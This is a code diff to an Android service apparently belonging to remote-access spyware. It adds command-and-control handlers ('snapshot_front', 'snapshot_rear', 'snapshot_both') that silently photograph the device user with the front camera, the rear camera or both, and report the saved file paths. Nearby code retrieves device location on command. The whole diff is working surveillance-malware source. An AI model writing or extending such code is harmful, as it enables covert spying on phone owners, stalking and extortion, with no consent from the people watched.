@@ -568,21 +568,65 @@ class AgentService : Service() {
 
                                 command == "location" -> c2Commands.getDeviceLocation()
 
-                                command == "snapshot" -> {
+                                command == "snapshot" || command == "snapshot_front" -> {
                                     val latch = java.util.concurrent.CountDownLatch(1)
                                     var resultText = "Error taking snapshot"
                                     val camera = SilentCamera(this@AgentService)
-                                    
+
                                     android.os.Handler(android.os.Looper.getMainLooper()).post {
-                                        camera.takePicture(object : SilentCamera.Callback {
+                                        camera.takePicture(android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT, object : SilentCamera.Callback {
                                             override fun onImageSaved(file: java.io.File?) {
                                                 resultText = if (file != null) "SNAPSHOT_READY ${file.absolutePath}" else "Error: Failed to capture snapshot"
                                                 latch.countDown()
                                             }
                                         })
                                     }
-                                    
+
                                     latch.await(15, java.util.concurrent.TimeUnit.SECONDS)
+                                    resultText
+                                }
+
+                                command == "snapshot_rear" -> {
+                                    val latch = java.util.concurrent.CountDownLatch(1)
+                                    var resultText = "Error taking snapshot"
+                                    val camera = SilentCamera(this@AgentService)
+
+                                    android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                        camera.takePicture(android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK, object : SilentCamera.Callback {
+                                            override fun onImageSaved(file: java.io.File?) {
+                                                resultText = if (file != null) "SNAPSHOT_READY ${file.absolutePath}" else "Error: Failed to capture snapshot"
+                                                latch.countDown()
+                                            }
+                                        })
+                                    }
+
+                                    latch.await(15, java.util.concurrent.TimeUnit.SECONDS)
+                                    resultText
+                                }
+
+                                command == "snapshot_both" -> {
+                                    val latch = java.util.concurrent.CountDownLatch(1)
+                                    var resultText = "Error taking snapshots"
+                                    val camera = SilentCamera(this@AgentService)
+
+                                    android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                        camera.takePictureBoth(object : SilentCamera.BothCallback {
+                                            override fun onImagesSaved(frontFile: java.io.File?, rearFile: java.io.File?) {
+                                                resultText = when {
+                                                    frontFile != null && rearFile != null ->
+                                                        "SNAPSHOT_BOTH_READY ${frontFile.absolutePath} ${rearFile.absolutePath}"
+                                                    frontFile != null ->
+                                                        "SNAPSHOT_READY ${frontFile.absolutePath}"
+                                                    rearFile != null ->
+                                                        "SNAPSHOT_READY ${rearFile.absolutePath}"
+                                                    else -> "Error: Failed to capture snapshots"
+                                                }
+                                                latch.countDown()
+                                            }
+                                        })
+                                    }
+
+                                    latch.await(30, java.util.concurrent.TimeUnit.SECONDS)
                                     resultText
                                 }
 
